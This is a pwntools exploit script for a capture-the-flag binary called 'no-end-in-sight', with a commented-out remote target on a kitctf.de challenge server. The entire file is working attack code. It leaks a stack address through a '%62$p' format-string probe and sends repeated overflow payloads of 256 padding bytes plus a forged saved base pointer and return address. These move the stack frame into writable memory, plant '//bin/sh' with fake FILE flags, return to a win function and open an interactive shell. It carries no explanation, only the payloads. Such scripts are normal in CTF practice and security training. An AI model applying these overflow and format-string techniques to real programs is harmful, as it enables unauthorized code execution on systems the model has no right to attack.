from pwn import *
import time
context.log_level = 'debug'
context.arch = 'amd64'
e = context.binary = ELF('./no-end-in-sight')
r=process("./no-end-in-sight")
lib = e.libc
# r = remote('no-end-in-sight-0.chals.kitctf.de', 1337, ssl=True)
# Step 2:
# ...
# s=0x68732f6e69622f2f2f
s= b"//bin/sh"
fgets_main=0x4011A7
bin_sh=0x404028
rbp= 0x404501
win =0x401146
exec_plt=0x401050   
fgets_1=0x40116A#fgets1
main=0x401166
b_str_add=0x404500
#leak and setup rbp
sleep(0.1)
r.sendline(b"%62$p")
# r.recv(1)
sleep(0.1)
pause()
payload=b"a"*256 + p64(0x404500+0xff)+ p64(fgets_main)
r.send(payload)

b_str=r.recvline()
b_str= int(b_str.decode().strip(), 16)
print(hex(b_str))


pause()
payload=p64(b_str).ljust(255,b"a") + p64(b_str+0xff) + p64(main)
r.send(payload)

r.sendline(b"%62$p")

pause()
payload=p64(b_str).ljust(255,b"a") + p64(bin_sh+0xff) + p64(fgets_main)
r.send(payload)

pause()
payload=s+p64(0xfbad2288)*5
payload =payload.ljust(255,b"C") +p64(b_str_add+0xff)+p64(main)
r.sendline(payload)

sleep(0.1)
r.sendline(s+p64(0xfbad2288)*5)

pause()
payload=b""
payload =payload.ljust(255,b"a") +p64(b_str_add+0xa00)+p64(win)
r.sendline(payload)



# pause()
# payload=flat(s, 0xfbad2288).ljust(255,b"a") + flat(bin_sh+0x100, fgets_main)
# r.send(payload)

r.interactive()